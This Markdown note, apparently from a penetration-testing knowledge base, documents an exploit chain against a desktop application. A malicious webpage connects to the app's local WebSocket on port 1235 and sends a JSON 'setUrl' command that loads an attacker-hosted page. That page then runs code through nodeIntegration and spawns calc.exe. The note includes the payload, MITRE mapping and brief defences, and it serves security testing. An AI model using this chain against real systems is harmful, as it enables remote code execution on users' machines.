---
tags:
  - rce-chain
  - exploit
type: procedure
tools:
  - '[[tools/Process-Monitor]]'
  - '[[tools/Burp-Suite]]'
  - '[[tools/Request-Highlighter]]'
tactics:
  - '[[procedures/Exploit-NodeIntegration-for-Code-Execution]]'
commands:
  - '[[commands/websocket-seturldefaultbrowser-calc]]'
  - '[[commands/require-child-process-exec-calc]]'
platforms:
  - Windows
techniques:
  - '[[Command-Line Interface]]'
skill_level: advanced
impact_level: critical
detection_risk: high
sub_techniques: []
id: d2f4f97a-a5e3-4c9a-8686-30f7554b1892
created_at: '2025-12-11T03:47:56.473Z'
updated_at: '2025-12-11T03:47:56.473Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[TA0002]]'
mitre_techniques:
  - '[[T1059]]'
---
# Chain Vulnerabilities for Full RCE

## Summary

This procedure chains the WebSocket origin bypass, arbitrary URL loading, and nodeIntegration to achieve RCE from a malicious website.

## Description

A webpage connects to the local WebSocket, sends a setUrl command to load a malicious URL in AGL, which then executes code via Node.js.

## Requirements

1. All prior vulnerabilities confirmed
2. Malicious webpage that initiates WebSocket connection
3. Application running on the target machine

## Defense

Defensive measures and detection strategies:

- Patch the application to fix chained issues
- Use browser isolation or disable local WebSocket access

## Objectives

1. Initiate from arbitrary website
2. Load malicious URL via WebSocket
3. Achieve full system RCE

## Instructions

### Step 1: Load Malicious Webpage

**Context**: Visit a webpage that connects to ws://localhost:1235.

The page sends the command to load the malicious URL.

> WebSocket connection established.

### Step 2: Send Chained Command

**Context**: Send the setUrl command for the malicious payload.

**Command** ([[commands/websocket-seturl-malicious]]):
```json
{"command":"setUrl","params":{"url":"https://[redacted].s3.us-east-1.amazonaws.com/node.html"},"source":"QAS","target":"AGL"}
```

> AGL loads the URL and executes code, spawning calc.exe.

## MITRE ATT&CK Mapping

### Tactics

- [[procedures/Exploit-NodeIntegration-for-Code-Execution]]

### Techniques

- [[Command-Line Interface]]

### Sub-Techniques



## Commands Used

- [[commands/websocket-seturl-malicious]]

## Tools Used



## Tags

- #rce-chain
- [[Exploit]]
